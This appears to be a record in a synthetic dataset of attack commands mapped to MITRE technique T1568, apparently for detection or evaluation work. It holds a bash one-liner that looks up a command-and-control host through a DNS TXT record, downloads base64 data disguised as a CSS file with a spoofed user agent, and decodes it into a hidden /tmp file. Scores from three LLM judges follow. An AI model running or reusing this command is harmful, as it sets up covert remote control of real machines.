@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "c2host=$(dig +short TXT _c2.api-sync-mirror.net | tr -d '\"' | head -1); ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; [ -n \"$c2host\" ] && wget -qO- --user-agent=\"$ua\" --header=\"Accept: text/css,*/*;q=0.1\" --timeout=10 \"http://$c2host/styles/site.css\" | /usr/bin/base64 -D > /tmp/.dns_txt_cmd",
+  "explanation": "Leverages DNS TXT records to dynamically point to the active C2 hostname at runtime, then retrieves base64-encoded instructions via a benign-looking CSS path.",
+  "rationale_steps": [
+    "Query DNS TXT for the current C2 host (dynamic resolution).",
+    "Mimic static asset retrieval with realistic headers.",
+    "Decode C2 data from base64 into a local file."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-af57373f",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignment, conditional execution, balanced quotes, appropriate command separators, valid flags for all tools used (dig, tr, head, wget, base64), and correct piping between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using DNS TXT records to dynamically retrieve the C2 server address, disguising the traffic as CSS requests with a legitimate user agent, and decoding base64 content for execution - all core elements of dynamic C2 infrastructure.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:44:58.827219Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct command substitution, proper quoting for variables and strings, valid flags, and appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of T1568 Dynamic Resolution by dynamically resolving a C2 hostname via DNS TXT records and then retrieving base64-encoded instructions, mimicking realistic C2 behavior and operational security practices.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T07:45:06.230728Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with balanced quotes, valid substitutions, proper test and logical-AND, and a correct wget-to-base64 pipeline with redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It dynamically resolves a C2 host via DNS TXT and conditionally fetches and base64-decodes instructions from a benign-looking CSS path, consistent with T1568, though using wget on macOS and potential TXT multi-string tokenization are minor realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:45:40.971681Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
